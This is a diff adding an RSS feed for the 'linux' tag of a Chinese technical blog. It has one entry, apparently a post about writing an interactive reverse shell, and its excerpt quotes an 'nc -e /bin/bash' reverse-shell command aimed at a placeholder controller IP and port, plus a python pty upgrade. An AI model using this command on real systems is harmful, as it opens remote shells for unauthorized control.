@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>linux on 二进制咸鱼的自我救赎</title>
+    <link>https://chenx6.github.io/tags/linux/</link>
+    <description>Recent content in linux on 二进制咸鱼的自我救赎</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-hans</language>
+    <lastBuildDate>Mon, 02 May 2022 19:19:57 +0800</lastBuildDate><atom:link href="https://chenx6.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>写一个可交互的反弹 Shell</title>
+      <link>https://chenx6.github.io/post/rev_pty/</link>
+      <pubDate>Mon, 02 May 2022 19:19:57 +0800</pubDate>
+      
+      <guid>https://chenx6.github.io/post/rev_pty/</guid>
+      <description>在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 nc -e /bin/bash $控制机IP $控制机端口 弹出一个 Shell，然后再用 python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上</description>
+    </item>
+    
+  </channel>
+</rss>
